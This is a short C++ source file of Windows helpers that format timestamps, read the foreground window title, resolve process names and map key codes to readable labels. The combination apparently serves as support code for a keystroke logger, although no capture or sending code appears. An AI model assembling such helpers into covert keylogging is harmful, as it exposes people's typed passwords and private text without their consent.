#include "utils.h"
#include <ctime>
#include <psapi.h>

std::wstring GetTimestamp() {
    time_t t = time(nullptr);
    tm lt; localtime_s(&lt, &t);
    wchar_t buf[64];
    wcsftime(buf, 64, L"[%Y-%m-%d %H:%M:%S]", &lt);
    return buf;
}

std::wstring GetWindowTitle() {
    wchar_t title[512] = {};
    HWND w = GetForegroundWindow();
    if (w && GetWindowTextW(w, title, 512)) return title;
    return L"[no title]";
}

std::wstring GetProcessName(DWORD pid) {
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!h) return L"[?]";
    wchar_t name[MAX_PATH] = {};
    DWORD sz = MAX_PATH;
    if (QueryFullProcessImageNameW(h, 0, name, &sz))
        name[sz] = 0;
    CloseHandle(h);
    wchar_t* p = wcsrchr(name, L'\\');
    return p ? p + 1 : name;
}

std::wstring GetKeyName(DWORD vk, DWORD scan, bool ext) {
    wchar_t buf[64] = {};
    if (scan == 0) scan = MapVirtualKey(vk, MAPVK_VK_TO_VSC);
    if (ext) scan |= 0xE000;
    if (GetKeyNameTextW(scan << 16, buf, 64)) return buf;

    switch (vk) {
    case VK_RETURN:   return L"[Enter]";
    case VK_BACK:     return L"[Backspace]";
    case VK_TAB:      return L"[Tab]";
    case VK_SPACE:    return L"[Space]";
    case VK_ESCAPE:   return L"[Esc]";
    case VK_SHIFT:    return L"[Shift]";
    case VK_CONTROL:  return L"[Ctrl]";
    case VK_MENU:     return L"[Alt]";
    case VK_LWIN: case VK_RWIN: return L"[Win]";
    case VK_F1:  return L"[F1]";  case VK_F2:  return L"[F2]";
    case VK_F3:  return L"[F3]";  case VK_F4:  return L"[F4]";
    case VK_F5:  return L"[F5]";  case VK_F6:  return L"[F6]";
    case VK_F7:  return L"[F7]";  case VK_F8:  return L"[F8]";
    case VK_F9:  return L"[F9]";  case VK_F10: return L"[F10]";
    case VK_F11: return L"[F11]"; case VK_F12: return L"[F12]";
    }
    return L"?";
}